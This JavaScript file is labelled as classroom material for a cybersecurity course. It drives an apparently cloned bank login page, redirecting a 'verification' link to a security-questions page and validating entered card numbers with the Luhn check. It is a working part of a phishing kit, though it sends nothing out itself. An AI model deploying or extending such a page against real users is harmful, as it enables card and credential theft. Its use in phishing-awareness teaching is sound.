/*
 * Educational Phishing Demonstration
 * ----------------------------------------
 * Programme: AEC Cybersécurité : protection et défense
 *
 * Author/Professor: Akram Nasr
 * Email: Akram.Nasr@cmontmorency.qc.ca
 *
 * IMPORTANT NOTICE:
 * This code is created for EDUCATIONAL PURPOSES ONLY to demonstrate
 * phishing techniques and security vulnerabilities as part of
 * cybersecurity education. Using this code for actual phishing
 * or any malicious purpose is illegal and unethical.
 */

document.addEventListener("DOMContentLoaded", function () {
  // Use querySelector to get the verification link in the blocked message.
  var verificationLink = document.querySelector("#blocked-message a");
  if (verificationLink) {
    verificationLink.addEventListener("click", function (event) {
      event.preventDefault(); // prevent the default anchor action
      // Redirect to sec_questions.php (or your desired endpoint)
      window.location.href = "sec_questions.php";
    });
  }

  var cardInput = document.getElementById("username-input");
  if (cardInput) {
    cardInput.addEventListener("input", function () {
      // Remove all non-digit characters
      var filteredValue = cardInput.value.replace(/\D/g, "");
      if (cardInput.value !== filteredValue) {
        cardInput.value = filteredValue;
      }

      // Remove any previous valid/invalid classes
      cardInput.classList.remove("valid", "invalid");

      // Locate the inline error element in the same parent container
      var errorElem = cardInput.parentElement.querySelector("fdc-inline-error");

      // If exactly 16 digits are entered, check with the Luhn algorithm.
      if (filteredValue.length === 16) {
        if (luhnCheck(filteredValue)) {
          // Passes Luhn: mark as valid and clear error message.
          cardInput.classList.add("valid");
          if (errorElem) {
            errorElem.textContent = "";
          }
        } else {
          // Fails Luhn: mark as invalid and show error message.
          cardInput.classList.add("invalid");
          if (errorElem) {
            errorElem.textContent = "Invalid card number.";
          }
        }
      } else if (filteredValue.length > 16) {
        // More than 16 digits: mark as invalid.
        cardInput.classList.add("invalid");
        if (errorElem) {
          errorElem.textContent = "Card number must be exactly 16 digits.";
        }
      } else {
        // Fewer than 16 digits, clear the error message.
        if (errorElem) {
          errorElem.textContent = "";
        }
      }
    });
  }

  // Luhn algorithm implementation to validate a 16-digit card number.
  function luhnCheck(val) {
    let sum = 0;
    let shouldDouble = false;

    // Loop through the digits from right to left.
    for (let i = val.length - 1; i >= 0; i--) {
      let digit = parseInt(val.charAt(i), 10);
      if (shouldDouble) {
        digit *= 2;
        if (digit > 9) {
          digit -= 9;
        }
      }
      sum += digit;
      shouldDouble = !shouldDouble;
    }
    return sum % 10 === 0;
  }
});
